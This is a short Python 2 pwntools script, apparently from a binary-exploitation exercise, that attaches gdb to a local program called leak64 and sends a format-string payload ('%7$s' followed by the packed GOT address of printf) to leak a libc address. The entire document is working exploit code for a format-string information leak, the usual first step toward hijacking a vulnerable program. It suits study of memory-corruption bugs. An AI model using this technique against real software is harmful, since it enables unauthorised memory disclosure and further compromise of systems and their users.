#64bit leak
from pwn import *
context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
p = process("./leak64")
e = ELF("./leak64")
read_got = e.got['printf']
gdb.attach(p,"directory /opt/glibc-2.23/stdio-common/")

payload = "%7$s".ljust(8,"c")
payload+=p64(read_got)

#payload = p64(read_got)+"%6$s"
pause()

p.recv(1)
p.sendline(payload)
print p.recv()
